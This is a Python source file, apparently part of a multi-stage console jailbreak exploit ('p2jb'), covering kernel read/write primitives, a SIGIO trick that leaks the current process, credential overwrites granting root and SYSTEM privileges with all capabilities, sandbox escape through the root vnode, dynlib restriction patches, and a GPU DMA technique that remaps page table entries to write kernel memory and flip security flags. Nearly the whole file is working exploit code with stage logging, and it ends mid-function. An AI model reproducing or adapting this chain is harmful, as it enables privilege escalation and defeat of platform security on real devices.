    def _bump_refcount(fp, delta, label):
        rc = S.kread32(fp + 0x28)
        if 0 < rc < 0x10000:
            S.kwrite32(fp + 0x28, (rc + delta) & 0xFFFFFFFF)
            log("[stage4b] bump %s fp=0x%x rc %d -> %d" %
                (label, fp, rc, rc + delta))
            return True
        log("[stage4b] WARN: bad %s fp=0x%x rc=0x%x (skip bump)" %
            (label, fp, rc))
        return False

    master_rfp = S.kread64(
        S.fd_ofiles + S.master_rfd * KOFF["FILEDESCENT_SIZE"])
    master_wfp = S.kread64(
        S.fd_ofiles + S.master_wfd * KOFF["FILEDESCENT_SIZE"])
    victim_rfp = S.kread64(
        S.fd_ofiles + S.victim_rfd * KOFF["FILEDESCENT_SIZE"])
    victim_wfp = S.kread64(
        S.fd_ofiles + S.victim_wfd * KOFF["FILEDESCENT_SIZE"])

    for fp, label in (
        (master_rfp, "master_r"),
        (master_wfp, "master_w"),
        (victim_rfp, "victim_r"),
        (victim_wfp, "victim_w"),
    ):
        if fp == 0 or (fp >> 48) != 0xFFFF:
            raise Exception("stage4b: bad fp %s = 0x%x" % (label, fp))
        _bump_refcount(fp, 0x100, label)

    def _null_rthdr(fd):
        fp = S.kread64(S.fd_ofiles + fd * KOFF["FILEDESCENT_SIZE"])
        if fp == 0 or (fp >> 48) != 0xFFFF:
            return False
        f_data = S.kread64(fp)
        if f_data == 0 or (f_data >> 48) != 0xFFFF:
            return False
        so_pcb = S.kread64(f_data + KOFF["SO_PCB"])
        if so_pcb == 0 or (so_pcb >> 48) != 0xFFFF:
            return False
        pktopts = S.kread64(so_pcb + KOFF["INPCB_PKTOPTS"])
        if pktopts == 0 or (pktopts >> 48) != 0xFFFF:
            return False
        S.kwrite64(pktopts + KOFF["IP6PO_RTHDR"], 0)
        return True

    nullified = 0
    for fd in S.ipv6_sockets:
        if _null_rthdr(fd):
            nullified += 1
    log("[stage4b] null_rthdr on %d/%d ipv6_sockets" %
        (nullified, len(S.ipv6_sockets)))

    S.ucred_A = 0
    if S.free_fd_idx < len(S.free_fds):
        sample_fd = S.free_fds[S.free_fd_idx]
        sample_fp = S.kread64(
            S.fd_ofiles + sample_fd * KOFF["FILEDESCENT_SIZE"])
        if sample_fp != 0 and (sample_fp >> 48) == 0xFFFF:
            fcred = S.kread64(sample_fp + 0x10)
            if fcred != 0 and (fcred >> 48) == 0xFFFF:
                S.ucred_A = fcred
                log("[stage4b] captured ucred_A=0x%x from free_fd[%d]=%d" %
                    (S.ucred_A, S.free_fd_idx, sample_fd))

    leftover = len(S.free_fds) - S.free_fd_idx
    for i in range(S.free_fd_idx, len(S.free_fds)):
        sc.syscalls.close(S.free_fds[i])
    log("[stage4b] closed %d leftover free_fds (idx=%d total=%d)" %
        (leftover, S.free_fd_idx, len(S.free_fds)))

    for fd in S.ipv6_sockets:
        sc.syscalls.close(fd)
    log("[stage4b] closed %d ipv6_sockets" % len(S.ipv6_sockets))

    sc.syscalls.close(S.iov_sock_a)
    sc.syscalls.close(S.iov_sock_b)
    sc.syscalls.close(S.uio_sock_a)
    sc.syscalls.close(S.uio_sock_b)
    log("[stage4b] closed iov + uio socketpairs")

    try:
        S.iov_ws.signal()
        log("[stage4b] iov_ws signalled (4 workers, EBADF + re-park)")
    except Exception as _e:
        log("[stage4b] WARN: iov_ws.signal failed: %s" % str(_e))
    try:
        S.uio_read_ws.signal()
        log("[stage4b] uio_read_ws signalled")
    except Exception as _e:
        log("[stage4b] WARN: uio_read_ws.signal failed: %s" % str(_e))
    try:
        S.uio_write_ws.signal()
        log("[stage4b] uio_write_ws signalled")
    except Exception as _e:
        log("[stage4b] WARN: uio_write_ws.signal failed: %s" % str(_e))

    sc.syscalls.sched_yield()
    sc.syscalls.sched_yield()

    log("[stage4b] settling 3s")
    yieldable_sleep_ms(3000)
    log("[stage4b] DONE - cleanup complete")


def stage4_sigio(S):
    log("[stage4b] sigio trick to leak curproc")
    FIOSETOWN = 0x8004667C

    pipe_buf = alloc(8)
    sc.syscalls.pipe(pipe_buf)
    sigio_rfd = struct.unpack("<I", bytes(pipe_buf[0:4]))[0]
    sigio_wfd = struct.unpack("<I", bytes(pipe_buf[4:8]))[0]

    our_pid = u64_to_i64(sc.syscalls.getpid()) & 0xFFFFFFFF
    pid_arg = alloc(4)
    pid_arg[0:4] = struct.pack("<I", our_pid)
    sc.syscalls.ioctl(sigio_rfd, FIOSETOWN, pid_arg)

    sigio_fp = S.kread64(S.fd_ofiles + sigio_rfd * KOFF["FILEDESCENT_SIZE"])
    if sigio_fp == 0 or (sigio_fp >> 48) != 0xFFFF:
        raise Exception("stage4b: bad sigio_fp 0x%x" % sigio_fp)

    sigio_pipe = S.kread64(sigio_fp)
    if sigio_pipe == 0 or (sigio_pipe >> 48) != 0xFFFF:
        raise Exception("stage4b: bad sigio_pipe 0x%x" % sigio_pipe)

    pipe_sigio = S.kread64(sigio_pipe + KOFF["PIPE_SIGIO"])
    if pipe_sigio == 0 or (pipe_sigio >> 48) != 0xFFFF:
        raise Exception("stage4b: no sigio attached (0x%x)" % pipe_sigio)

    curproc = S.kread64(pipe_sigio)
    if curproc == 0 or (curproc >> 48) != 0xFFFF:
        raise Exception("stage4b: bad curproc 0x%x" % curproc)

    pid_check = S.kread32(curproc + KOFF["PROC_PID"])
    if pid_check != our_pid:
        raise Exception(
            "stage4b: pid mismatch curproc.pid=%d our_pid=%d" %
            (pid_check, our_pid))

    sc.syscalls.close(sigio_rfd)
    sc.syscalls.close(sigio_wfd)

    S.curproc = curproc
    S.proc_ucred = S.kread64(curproc + KOFF["PROC_UCRED"])
    S.proc_fd    = S.kread64(curproc + KOFF["PROC_FD"])
    log("[stage4b] curproc=0x%x  proc_ucred=0x%x  proc_fd=0x%x" %
        (curproc, S.proc_ucred, S.proc_fd))


def stage4_full(S):
    stage4(S)
    log("[p2jb] *** STAGE4 SUCCESS *** fast kernel R/W primitive ready")
    setup_fast_kernel_rw(S)
    log("[p2jb] fast R/W primitives installed on S")
    stage4b_cleanup(S)
    log("[p2jb] *** STAGE4B CLEANUP SUCCESS ***")
    stage4_sigio(S)
    log("[p2jb] *** STAGE4B SUCCESS *** curproc=0x%x" % S.curproc)


def stage5(S):
    log("[stage5] walking allproc -> kernel_proc -> rootvnode")
    sc.send_notification("Stage 5\nFind rootvnode")

    p = S.curproc
    kernel_proc = 0
    for i in range(1000):
        if p == 0:
            break
        if (p >> 48) != 0xFFFF:
            break
        if S.kread32(p + KOFF["PROC_PID"]) == 0:
            kernel_proc = p
            break
        p = S.kread64(p)

    if not kernel_proc:
        raise Exception("stage5: kernel proc (pid=0) not found")

    kernel_fd = S.kread64(kernel_proc + KOFF["PROC_FD"])
    if kernel_fd == 0 or (kernel_fd >> 48) != 0xFFFF:
        raise Exception("stage5: kernel_fd bad: 0x%x" % kernel_fd)

    rootvnode = S.kread64(kernel_fd + KOFF["FD_CDIR"])
    if rootvnode == 0 or (rootvnode >> 48) != 0xFFFF:
        raise Exception("stage5: rootvnode bad: 0x%x" % rootvnode)

    S.rootvnode = rootvnode
    log("[stage5] kernel_proc=0x%x  rootvnode=0x%x" %
        (kernel_proc, rootvnode))


def stage6(S):
    log("[stage6] *** APPLYING JAILBREAK ***")
    sc.send_notification("Stage 6\nJailbreak")

    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_UID"],     0)
    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_RUID"],    0)
    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_SVUID"],   0)
    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_NGROUPS"], 1)
    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_RGID"],    0)
    S.kwrite32(S.proc_ucred + KOFF["UCRED_CR_SVGID"],   0)

    S.kwrite64(S.proc_ucred + KOFF["UCRED_CR_SCEAUTHID"], SYSTEM_AUTHID)
    S.kwrite64(S.proc_ucred + KOFF["UCRED_CR_SCECAPS0"],  0xFFFFFFFFFFFFFFFF)
    S.kwrite64(S.proc_ucred + KOFF["UCRED_CR_SCECAPS1"],  0xFFFFFFFFFFFFFFFF)

    S.kwrite8(S.proc_ucred + 0x83, 0x80)

    S.kwrite64(S.proc_fd + KOFF["FD_RDIR"], S.rootvnode)
    S.kwrite64(S.proc_fd + KOFF["FD_JDIR"], S.rootvnode)

    if S.kread32(S.proc_ucred + KOFF["UCRED_CR_UID"]) != 0:
        raise Exception("stage6: jailbreak verify failed (cr_uid != 0)")

    log("[stage6] *** JAILBREAK OK *** cr_uid=0 cr_authid=SYSTEM caps=FF..FF")
    log("[stage6] proc is now SYSTEM, unjailed at /")


def stage7(S):
    log("[stage7] resolving kernel data_base")
    sc.send_notification("Stage 7\nResolve kernel data_base")

    KDATA_MASK = 0xffff804000000000
    p = S.curproc
    allproc = 0
    for _ in range(64):
        if (p != 0 and (p & KDATA_MASK) == KDATA_MASK and
                ((p - KOFF["DATA_BASE_ALLPROC"]) & 0xFFF) == 0):
            allproc = p
            break
        p = S.kread64(p + 8)

    if allproc == 0:
        S.data_base_ok = False
        log("[stage7] allproc not found - elf loader skipped (jb already done)")
        return

    data_base = allproc - KOFF["DATA_BASE_ALLPROC"]
    S.data_base = data_base
    log("[stage7] allproc=0x%x  data_base=0x%x" % (allproc, data_base))

    first_proc = S.kread64(allproc)
    first_proc_ok = (first_proc >> 48) == 0xFFFF
    log("[stage7] *allproc=0x%x  %s" %
        (first_proc, "(kptr OK)" if first_proc_ok else "(BAD)"))
    S.data_base_ok = first_proc_ok

    if not first_proc_ok:
        log("[stage7] data_base validation FAILED - skipping further kernel work")


def stage8(S):
    log("[stage8] patching dynlib restrictions")
    sc.send_notification("Stage 8\nFinalize: dynlib restrictions")

    def is_kptr(v):
        return (v & 0xFFFF000000000000) == 0xFFFF000000000000

    p_dynlib = S.kread64(S.curproc + 0x3E8)
    if not is_kptr(p_dynlib):
        raise Exception("stage8: p_dynlib not a kptr: 0x%x" % p_dynlib)

    S.kwrite32(p_dynlib + 0x118, 0)
    S.kwrite64(p_dynlib + 0x18,  1)

    S.kwrite64(p_dynlib + 0xF0, 0)
    S.kwrite64(p_dynlib + 0xF8, 0xFFFFFFFFFFFFFFFF)

    dynlib_eboot = S.kread64(p_dynlib + 0x00)
    if not is_kptr(dynlib_eboot):
        raise Exception("stage8: dynlib_eboot not a kptr: 0x%x" % dynlib_eboot)

    eboot_segments = S.kread64(dynlib_eboot + 0x40)
    if not is_kptr(eboot_segments):
        raise Exception(
            "stage8: eboot_segments not a kptr: 0x%x" % eboot_segments)

    S.kwrite64(eboot_segments + 0x08, 0)
    S.kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFF)
    log("[stage8] dynlib patched (syscalls + dlsym unrestricted, p_dynlib=0x%x)"
        % p_dynlib)
    log("[stage8] *** JAILBREAK FINALIZED ***")
    sc.send_notification(P2JB_VERSION + "\nJailbroken")


def _cpu_pde_field(pde, field):
    return (pde >> CPU_PDE_SHIFT[field]) & CPU_PDE_MASKS[field]


def _cpu_walk_pt(cr3, vaddr, dmap_base, kread64):
    pml4e_index = (vaddr >> 39) & 0x1FF
    pdpe_index  = (vaddr >> 30) & 0x1FF
    pde_index   = (vaddr >> 21) & 0x1FF
    pte_index   = (vaddr >> 12) & 0x1FF

    pml4e = kread64(dmap_base + cr3 + (pml4e_index * 8))
    if _cpu_pde_field(pml4e, "PRESENT") != 1:
        return None
    pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME
    pdpe = kread64(dmap_base + pdp_base_pa + (pdpe_index * 8))
    if _cpu_pde_field(pdpe, "PRESENT") != 1:
        return None
    pd_base_pa = pdpe & CPU_PG_PHYS_FRAME
    pde = kread64(dmap_base + pd_base_pa + (pde_index * 8))
    if _cpu_pde_field(pde, "PRESENT") != 1:
        return None
    if _cpu_pde_field(pde, "PS") == 1:
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1FFFFF)
    pt_base_pa = pde & CPU_PG_PHYS_FRAME
    pte = kread64(dmap_base + pt_base_pa + (pte_index * 8))
    if _cpu_pde_field(pte, "PRESENT") != 1:
        return None
    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3FFF)


def _find_vmspace_pmap_offset(curproc, kread64):
    vmspace = kread64(curproc + KOFF["PROC_VM_SPACE"])
    cur_scan = 0x1D0
    for i in range(6):
        off = cur_scan + (i * 8)
        val = kread64(vmspace + off)
        diff = val - vmspace
        if 0x2C0 <= diff <= 0x2F0:
            return off
    raise Exception("find_vmspace_pmap_offset: not found")


def _find_vmspace_vmid_offset(curproc, kread64, kread32):
    vmspace = kread64(curproc + KOFF["PROC_VM_SPACE"])
    cur_scan = 0x1D8
    for i in range(8):
        off = cur_scan + (i * 4)
        val = kread32(vmspace + off)
        if 0 < val <= 0x10:
            return off
    raise Exception("find_vmspace_vmid_offset: not found")


def setup_gpu_dma(S):
    log("[gpu_dma] setup: resolving pmap_store + cr3 + dmap_base")
    pmap_store = S.data_base + KOFF["DATA_BASE_KERNEL_PMAP_STORE"]
    pml4 = S.ipv6_kread64(pmap_store + KOFF["PMAP_PML4"])
    cr3  = S.ipv6_kread64(pmap_store + KOFF["PMAP_CR3"])
    dmap_base = pml4 - cr3
    log("[gpu_dma] pmap_store=0x%x pml4=0x%x cr3=0x%x dmap_base=0x%x" %
        (pmap_store, pml4, cr3, dmap_base))

    if (cr3 & 0xFFF) != 0 or cr3 == 0 or cr3 >= 0x10000000000:
        raise Exception("setup_gpu_dma: cr3 sanity failed 0x%x" % cr3)
    if (dmap_base >> 48) != 0xFFFF or (dmap_base & 0xFFF) != 0:
        raise Exception("setup_gpu_dma: dmap_base sanity failed 0x%x" % dmap_base)

    S.kernel_cr3 = cr3
    S.dmap_base  = dmap_base

    KOFF["VMSPACE_VM_PMAP"] = _find_vmspace_pmap_offset(S.curproc, S.ipv6_kread64)
    KOFF["VMSPACE_VM_VMID"] = _find_vmspace_vmid_offset(S.curproc, S.ipv6_kread64, S.ipv6_kread32)
    log("[gpu_dma] VMSPACE_VM_PMAP=0x%x VMSPACE_VM_VMID=0x%x" %
        (KOFF["VMSPACE_VM_PMAP"], KOFF["VMSPACE_VM_VMID"]))

    S.gpu = GPU(S)
    log("[gpu_dma] GPU instance ready")


class GPU(object):
    O_RDWR = 0x2
    IOCTL_GC_SUBMIT = 0xC0108102

    def __init__(self, S):
        self.S = S
        self.dmem_size = 2 * 0x100000

        out = alloc(8)
        rc = u64_to_i64(sc.syscalls.dlsym(
            LIBKERNEL_HANDLE_GPU, b"sceKernelAllocateMainDirectMemory", out))
        if rc != 0:
            raise Exception("GPU: dlsym sceKernelAllocateMainDirectMemory fail")
        self.sceKernelAllocateMainDirectMemory_addr = struct.unpack("<Q", bytes(out[0:8]))[0]

        rc = u64_to_i64(sc.syscalls.dlsym(
            LIBKERNEL_HANDLE_GPU, b"sceKernelMapDirectMemory", out))
        if rc != 0:
            raise Exception("GPU: dlsym sceKernelMapDirectMemory fail")
        self.sceKernelMapDirectMemory_addr = struct.unpack("<Q", bytes(out[0:8]))[0]

        self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
            "sceKernelAllocateMainDirectMemory",
            self.sceKernelAllocateMainDirectMemory_addr)
        self.sceKernelMapDirectMemory = sc.make_function_if_needed(
            "sceKernelMapDirectMemory",
            self.sceKernelMapDirectMemory_addr)

        gc_path = alloc(8)
        gc_path[0:8] = b"/dev/gc\x00"
        self.gc_fd = u64_to_i64(sc.syscalls.open(gc_path, self.O_RDWR))
        if self.gc_fd < 0:
            raise Exception("GPU: open /dev/gc failed errno=%d" %
                            sc.syscalls.open.errno)
        log("[gpu_dma] /dev/gc fd=%d" % self.gc_fd)

        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
        prot_rw = prot_ro | GPU_WRITE

        victim_va, _   = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
        transfer_va, _ = self.alloc_main_dmem(self.dmem_size, prot_rw, MAP_NO_COALESCE)
        cmd_va, _      = self.alloc_main_dmem(self.dmem_size, prot_ro, MAP_NO_COALESCE)
        log("[gpu_dma] victim_va=0x%x transfer_va=0x%x cmd_va=0x%x" %
            (victim_va, transfer_va, cmd_va))

        curproc_cr3 = self._proc_cr3(S.curproc)
        victim_real_pa = _cpu_walk_pt(curproc_cr3, victim_va, S.dmap_base, S.ipv6_kread64)
        if victim_real_pa is None:
            raise Exception("GPU: victim_va virt_to_phys failed")

        victim_ptbe_va, page_size = self.get_ptb_entry_of_relative_va(victim_va)
        if victim_ptbe_va is None or page_size != self.dmem_size:
            raise Exception("GPU: get_ptb_entry_of_relative_va failed")

        if u64_to_i64(sc.syscalls.mprotect(victim_va, self.dmem_size, prot_ro)) < 0:
            raise Exception("GPU: mprotect victim->ro failed errno=%d" %
                            sc.syscalls.mprotect.errno)

        initial_victim_ptbe = S.ipv6_kread64(victim_ptbe_va)
        cleared_victim_ptbe_for_ro = initial_victim_ptbe & ~victim_real_pa

        self.victim_va = victim_va
        self.transfer_va = transfer_va
        self.cmd_va = cmd_va
        self.victim_ptbe_va = victim_ptbe_va
        self.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro
        self.initial_victim_ptbe = initial_victim_ptbe

    def _proc_cr3(self, proc):
        vmspace = self.S.ipv6_kread64(proc + KOFF["PROC_VM_SPACE"])
        pmap_store = self.S.ipv6_kread64(vmspace + KOFF["VMSPACE_VM_PMAP"])
        return self.S.ipv6_kread64(pmap_store + KOFF["PMAP_CR3"])

    def alloc_main_dmem(self, size, prot, flag):
        out = alloc(8)
        mem_type = 1
        ret = self.sceKernelAllocateMainDirectMemory(size, size, mem_type, out)
        if u64_to_i64(ret) != 0:
            raise Exception("sceKernelAllocateMainDirectMemory rc=%d" %
                            u64_to_i64(ret))
        phys_addr = struct.unpack("<Q", bytes(out[0:8]))[0]
        out[0:8] = b"\0" * 8
        ret = self.sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)
        if u64_to_i64(ret) != 0:
            raise Exception("sceKernelMapDirectMemory rc=%d" % u64_to_i64(ret))
        virt_addr = struct.unpack("<Q", bytes(out[0:8]))[0]
        return virt_addr, phys_addr

    def _gpu_pde_field(self, pde, field):
        return (pde >> GPU_PDE_SHIFT[field]) & GPU_PDE_MASKS[field]

    def get_curproc_vmid(self):
        vmspace = self.S.ipv6_kread64(self.S.curproc + KOFF["PROC_VM_SPACE"])
        return self.S.ipv6_kread32(vmspace + KOFF["VMSPACE_VM_VMID"])

    def get_gvmspace(self, vmid):
        gvmspace_base = self.S.data_base + KOFF["DATA_BASE_GVMSPACE"]
        return gvmspace_base + (vmid * KOFF["SIZEOF_GVMSPACE"])

    def get_pdb2_addr(self, vmid):
        gvmspace = self.get_gvmspace(vmid)
        return self.S.ipv6_kread64(gvmspace + KOFF["GVMSPACE_PAGE_DIR_VA"])

    def get_relative_va(self, vmid, va):
        gvmspace = self.get_gvmspace(vmid)
        size = self.S.ipv6_kread64(gvmspace + KOFF["GVMSPACE_SIZE"])
        start_addr = self.S.ipv6_kread64(gvmspace + KOFF["GVMSPACE_START_VA"])
        end_addr = start_addr + size
        if start_addr <= va < end_addr:
            return va - start_addr
        return None

    def gpu_walk_pt(self, vmid, virt_addr):
        pdb2_addr = self.get_pdb2_addr(vmid)
        pml4e_index = (virt_addr >> 39) & 0x1FF
        pdpe_index  = (virt_addr >> 30) & 0x1FF
        pde_index   = (virt_addr >> 21) & 0x1FF
        dmap = self.S.dmap_base

        pml4e = self.S.ipv6_kread64(pdb2_addr + (pml4e_index * 8))
        if self._gpu_pde_field(pml4e, "VALID") != 1:
            return None, None
        pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK
        pdpe = self.S.ipv6_kread64(dmap + pdp_base_pa + (pdpe_index * 8))
        if self._gpu_pde_field(pdpe, "VALID") != 1:
            return None, None
        pdp_base_pa = pdpe & GPU_PDE_ADDR_MASK
        pde_va = dmap + pdp_base_pa + (pde_index * 8)
        pde = self.S.ipv6_kread64(pde_va)
        if self._gpu_pde_field(pde, "VALID") != 1:
            return None, None
        if self._gpu_pde_field(pde, "IS_PTE") == 1:
            return pde_va, 0x200000

        fragment_size = self._gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE")
        offset = virt_addr & 0x1FFFFF
        pt_base_pa = pde & GPU_PDE_ADDR_MASK
        pte_va, page_size = None, None
        if fragment_size == 4:
            pte_index = offset >> 16
            pte_va = dmap + pt_base_pa + (pte_index * 8)
            pte = self.S.ipv6_kread64(pte_va)
            if (self._gpu_pde_field(pte, "VALID") == 1
                    and self._gpu_pde_field(pte, "TF") == 1):
                pte_index = (virt_addr & 0xFFFF) >> 13
                pte_va = dmap + pt_base_pa + (pte_index * 8)
                page_size = 0x2000
            else:
                page_size = 0x10000
        elif fragment_size == 1:
            pte_index = offset >> 13
            pte_va = dmap + pt_base_pa + (pte_index * 8)
            page_size = 0x2000
        return pte_va, page_size

    def get_ptb_entry_of_relative_va(self, virt_addr):
        vmid = self.get_curproc_vmid()
        relative_va = self.get_relative_va(vmid, virt_addr)
        if relative_va is None:
            raise Exception("get_ptb_entry: va 0x%x not in vmid %d" %
                            (virt_addr, vmid))
        return self.gpu_walk_pt(vmid, relative_va)

    def _pm4_type3_header(self, opcode, count):
        return ((opcode & 0xFF) << 8) | ((((count - 1) & 0x3FFF) << 16) |
                (3 << 30) | (1 << 1))

    def _pm4_dma_data(self, dest_va, src_va, length):
        count = 6
        bufsize = 4 * (count + 1)
        opcode = 0x50
        command_len = length & 0x1FFFFF
        pm4 = alloc(bufsize)
        dma_hdr = (
            (0 & 1)
            | ((0 & 1) << 12)
            | ((2 & 3) << 13)
            | ((1 & 1) << 15)
            | ((0 & 3) << 20)
            | ((0 & 1) << 24)
            | ((2 & 3) << 25)
            | ((1 & 1) << 27)
            | ((0 & 3) << 29)
            | ((1 & 1) << 31)
        )
        pm4[0:4]   = struct.pack("<I", self._pm4_type3_header(opcode, count))
        pm4[4:8]   = struct.pack("<I", dma_hdr)
        pm4[8:16]  = struct.pack("<Q", src_va)
        pm4[16:24] = struct.pack("<Q", dest_va)
        pm4[24:28] = struct.pack("<I", command_len)
        return pm4

    def _build_command_descriptor(self, gpu_addr, size_in_bytes):
        size_in_dwords = size_in_bytes >> 2
        desc = alloc(16)
        qword0 = ((gpu_addr & 0xFFFFFFFF) << 32) | 0xC0023F00
        qword1 = ((size_in_dwords & 0xFFFFF) << 32) | ((gpu_addr >> 32) & 0xFFFF)
        desc[0:8]  = struct.pack("<Q", qword0)
        desc[8:16] = struct.pack("<Q", qword1)
        return desc

    def _ioctl_submit_commands(self, pipe_id, cmd_count, cmd_descriptors_addr):
        submit = alloc(0x10)
        submit[0:4]  = struct.pack("<I", pipe_id)
        submit[4:8]  = struct.pack("<I", cmd_count)
        submit[8:16] = struct.pack("<Q", cmd_descriptors_addr)
        ret = u64_to_i64(sc.syscalls.ioctl(
            self.gc_fd, self.IOCTL_GC_SUBMIT, submit))
        if ret < 0:
            raise Exception("ioctl GC_SUBMIT errno=%d" % sc.syscalls.ioctl.errno)

    def _submit_dma_data_command(self, dest_va, src_va, size):
        dma_data = self._pm4_dma_data(dest_va, src_va, size)
        log("[gpu_dma]     writebuf PM4 at virt cmd_va-0x1000=0x%x len=%d" %
            (self.cmd_va - 0x1000, len(dma_data)))
        from utils.unsafe import writebuf
        writebuf(self.cmd_va, bytes(dma_data))

        log("[gpu_dma]     build_command_descriptor cmd_va=0x%x len=%d" %
            (self.cmd_va, len(dma_data)))
        desc = self._build_command_descriptor(self.cmd_va, len(dma_data))
        self._ioctl_submit_commands(0, 1, get_ref_addr(desc))
        nanosleep_ms(200)

    def transfer_physical_buffer(self, phys_addr, size, is_write=False):
        trunc_pa = phys_addr & ~(self.dmem_size - 1)
        offset = phys_addr - trunc_pa
        if offset + size > self.dmem_size:
            raise Exception("transfer_physical_buffer: size too large")

        prot_ro = PROT_READ | PROT_WRITE | GPU_READ
        prot_rw = prot_ro | GPU_WRITE

        log("[gpu_dma] xfer phys=0x%x trunc=0x%x off=0x%x is_write=%s" %
            (phys_addr, trunc_pa, offset, is_write))

        if u64_to_i64(sc.syscalls.mprotect(self.victim_va, self.dmem_size, prot_ro)) < 0:
            raise Exception("mprotect victim ro errno=%d" %
                            sc.syscalls.mprotect.errno)

        new_ptb = self.cleared_victim_ptbe_for_ro | trunc_pa
        self.S.ipv6_kwrite64(self.victim_ptbe_va, new_ptb)

        if u64_to_i64(sc.syscalls.mprotect(self.victim_va, self.dmem_size, prot_rw)) < 0:
            raise Exception("mprotect victim rw errno=%d" %
                            sc.syscalls.mprotect.errno)

        if is_write:
            src = self.transfer_va
            dst = self.victim_va + offset
        else:
            src = self.victim_va + offset
            dst = self.transfer_va
        log("[gpu_dma]   step4: submit_dma src=0x%x dst=0x%x size=%d" %
            (src, dst, size))
        self._submit_dma_data_command(dst, src, size)

    def write_buffer(self, kaddr, buf):
        phys_addr = _cpu_walk_pt(self.S.kernel_cr3, kaddr,
                                 self.S.dmap_base, self.S.ipv6_kread64)
        if phys_addr is None:
            raise Exception("write_buffer: virt_to_phys failed for 0x%x" % kaddr)
        from utils.unsafe import writebuf
        writebuf(self.transfer_va, bytes(buf))
        self.transfer_physical_buffer(phys_addr, len(buf), is_write=True)

    def write_byte(self, kaddr, value):
        self.write_buffer(kaddr, struct.pack("<B", value & 0xFF))

    def write_dword(self, kaddr, value):
        self.write_buffer(kaddr, struct.pack("<I", value & 0xFFFFFFFF))


def stage9(S):
    if not S.data_base_ok:
        log("[stage9] skipping: data_base not validated")
        return
    if not hasattr(S, "gpu"):
        log("[stage9] skipping: S.gpu not set (setup_gpu_dma not called)")
        return
    log("[stage9] applying kernel patches (debug menu enable) via GPU DMA")
    sc.send_notification("Stage 9\nKernel patches: debug menu (GPU DMA)")

    sec_base       = S.data_base + KOFF["DATA_BASE_SECURITY_FLAGS"]
    security_flags = sec_base + 0x00
    target_id      = sec_base + 0x09
    qa_flags       = sec_base + 0x24
    utoken_flags   = sec_base + 0x8C

    log("[stage9] sec_base=0x%x" % sec_base)

    sf = S.kread32(security_flags)
    log("[stage9] security_flags pre=0x%x" % sf)
    S.gpu.write_dword(security_flags, sf | 0x14)
    log("[stage9] security_flags post=0x%x" % S.kread32(security_flags))

    ti = S.kread8(target_id)
    log("[stage9] target_id pre=0x%x" % ti)
    S.gpu.write_byte(target_id, 0x82)
    log("[stage9] target_id post=0x%x" % S.kread8(target_id))

    qaf = S.kread32(qa_flags)
    log("[stage9] qa_flags pre=0x%x" % qaf)
    S.gpu.write_dword(qa_flags, qaf | 0x10300)
    log("[stage9] qa_flags post=0x%x" % S.kread32(qa_flags))

    utk = S.kread8(utoken_flags)
    log("[stage9] utoken_flags pre=0x%x" % utk)
    S.gpu.write_byte(utoken_flags, utk | 0x01)
    log("[stage9] utoken_flags post=0x%x" % S.kread8(utoken_flags))

    log("[stage9] *** DEBUG MENU ENABLED ***")
    sc.send_notification(P2JB_VERSION + "\nDebug menu enabled")


def cleanup_exit(S, keep_rw=False):
    log("[cleanup_exit] restoring kernel state (keep_rw=%s)" % keep_rw)
    sc.send_notification("Cleanup: restore kernel state")


    if hasattr(S, "ucred_A") and S.ucred_A != 0 and hasattr(S, "proc_ucred"):
        try:
            A = S.ucred_A
            B = S.proc_ucred
            if (A >> 48) != 0xFFFF or (B >> 48) != 0xFFFF or A == B:
                log("[cleanup_exit] D8 pin skip: A=0x%x B=0x%x" % (A, B))
            else:
                PIN_REFS = 0x10000000
                buf = alloc(UCRED_SIZE)
                S.kread(buf, B, UCRED_SIZE)
                old_A_ref = S.kread32(A)
                buf[0:4] = struct.pack("<I", PIN_REFS)
                S.kwrite(A, buf, UCRED_SIZE)
                new_A_ref = S.kread32(A)
                if new_A_ref == PIN_REFS:
                    log("[cleanup_exit] D8 pin OK A=0x%x cr_ref %d -> 0x%x" %
                        (A, old_A_ref, PIN_REFS))
                else:
                    log("[cleanup_exit] D8 pin VERIFY FAIL cr_ref(A)=0x%x" %
                        new_A_ref)
        except Exception as _e:
            log("[cleanup_exit] D8 pin failed: %s" % str(_e))


    if not keep_rw:
        try:
            S.kwrite64(S.master_pipe_data + 0x10, 0)
            log("[cleanup_exit] master pipe.buffer nulled")
        except Exception as _e:
            log("[cleanup_exit] master.buffer null fail: %s" % str(_e))
    else:
        log("[cleanup_exit] master.buffer kept (keep_rw=True): fast R/W "
            "primitive resta viva per payload 2. KP rischio se game chiuso "
            "prima del payload 2.")

    try:
        if hasattr(S, "orig_main_core"):
            pin_to_core(S.orig_main_core)
            log("[cleanup_exit] restored main thread to core %d" %
                S.orig_main_core)
    except Exception as _e:
        log("[cleanup_exit] pin_to_core fail: %s" % str(_e))
    try:
        orig_prio = getattr(S, "orig_rtprio", 0)
        set_rtprio(orig_prio)
        log("[cleanup_exit] restored rtprio to %d" % orig_prio)
    except Exception as _e:
        log("[cleanup_exit] rtprio restore fail: %s" % str(_e))

    log("[cleanup_exit] DONE")


def build_ipv6_kernel_rw(S):
    log("[ipv6_krw] building scene-standard ELF kernel R/W primitive")
    sc.send_notification("Build IPv6 kernel R/W (ELF ABI)")

    pipe_fds = alloc(8)
    sc.syscalls.pipe(pipe_fds)
    elf_pipe_rfd = struct.unpack("<I", bytes(pipe_fds[0:4]))[0]
    elf_pipe_wfd = struct.unpack("<I", bytes(pipe_fds[4:8]))[0]
    log("[ipv6_krw] elf pipe rfd=%d wfd=%d" % (elf_pipe_rfd, elf_pipe_wfd))

    elf_pipe_fp = S.kread64(
        S.fd_ofiles + elf_pipe_rfd * KOFF["FILEDESCENT_SIZE"])
    elf_pipe_addr = S.kread64(elf_pipe_fp)
    log("[ipv6_krw] elf_pipe_addr=0x%x" % elf_pipe_addr)

